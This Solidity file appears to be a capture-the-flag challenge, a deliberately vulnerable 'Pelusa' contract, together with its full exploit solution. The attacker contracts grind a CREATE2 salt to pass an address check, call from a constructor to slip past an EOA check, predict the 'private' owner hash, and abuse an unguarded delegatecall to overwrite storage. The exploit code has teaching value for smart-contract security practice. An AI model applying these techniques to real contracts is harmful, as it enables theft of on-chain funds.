// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "hardhat/console.sol";
interface IGame {
    function getBallPossesion() external view returns (address);
}

contract Pelusa {
    address private immutable owner;
    address internal player;
    uint256 public goals = 1;

    constructor() {
        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));
    }

    function passTheBall() external {
        require(msg.sender.code.length == 0, "Only EOA players");
        require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");
        player = msg.sender;
    }

    function isGoal() public view returns (bool) {
        // expect ball in owners posession
        return IGame(player).getBallPossesion() == owner;
    }

    function shoot() external {
        require(isGoal(), "missed");
				/// @dev use "the hand of god" trick
        
        (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature("handOfGod()"));
        require(success, "missed1");
        require(uint256(bytes32(data)) == 22_06_1986);
    }
}

contract PelusaDeployer {
    ChallengePelusaAttacker public attacker;

    constructor(address target) {
        bytes32 salt = calculateSalt(target);
        attacker = new ChallengePelusaAttacker{ salt: bytes32(salt) }(target);
    }

    function attack(address _owner) external {
        attacker.attack(_owner);
    }
    function calculateSalt(address target) private view returns (bytes32) {
        uint256 salt = 0;
        bytes32 initHash = keccak256(abi.encodePacked(type(ChallengePelusaAttacker).creationCode, abi.encode(target)));

        while (true) {
            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), bytes32(salt), initHash));

            if (uint160(uint256(hash)) % 100 == 10) {
                break;
            }

            salt += 1;
        }

        return bytes32(salt);
    }
}

contract ChallengePelusaAttacker is IGame {
    address private  owner;
    uint256 public goals;

    Pelusa private pelusa;
    constructor(address _target) {
        pelusa = Pelusa(_target);
        pelusa.passTheBall();
    }

    function attack(address _owner) external {
        owner = address(uint160(uint256(keccak256(abi.encodePacked(_owner, bytes32(uint256(0)))))));
        pelusa.shoot();
    }

    function getBallPossesion() external view returns (address) {
        return owner;
    }

    function handOfGod() external returns (uint256) {
        goals = 2;
        return 22_06_1986;
    }
}